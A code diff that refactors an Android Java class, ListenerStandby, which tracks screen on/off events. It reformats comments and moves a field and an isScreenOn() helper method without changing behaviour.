@@ -18,17 +18,19 @@ import com.android.syssetup.Standby;
 import com.android.syssetup.Status;
 
 public class ListenerStandby extends Listener<Standby> {
-	/** The Constant TAG. */
+	/**
+	 * The Constant TAG.
+	 */
 	private static final String TAG = "ListenerStandby"; //$NON-NLS-1$
-
-	private BSt standbyReceiver;
-
-	/** The singleton. */
+	/**
+	 * The singleton.
+	 */
 	private volatile static ListenerStandby singleton;
+	private BSt standbyReceiver;
 
 	/**
 	 * Self.
-	 * 
+	 *
 	 * @return the status
 	 */
 	public static ListenerStandby self() {
@@ -41,6 +43,12 @@ public class ListenerStandby extends Listener<Standby> {
 		}
 
 		return singleton;
+	}
+
+	public static boolean isScreenOn() {
+		final PowerManager pm = (PowerManager) Status.getAppContext().getSystemService(Context.POWER_SERVICE);
+		final boolean isScreenOn = pm.isScreenOn();
+		return isScreenOn;
 	}
 
 	@Override
@@ -67,11 +75,5 @@ public class ListenerStandby extends Listener<Standby> {
 		Status.getAppContext().registerReceiver(standbyReceiver, filterOn);
 		Status.getAppContext().registerReceiver(standbyReceiver, filterOff);
 		//dispatch(new Standby(isScreenOn()));
-	}
-
-	public static boolean isScreenOn() {
-		final PowerManager pm = (PowerManager) Status.getAppContext().getSystemService(Context.POWER_SERVICE);
-		final boolean isScreenOn = pm.isScreenOn();
-		return isScreenOn;
 	}
 }
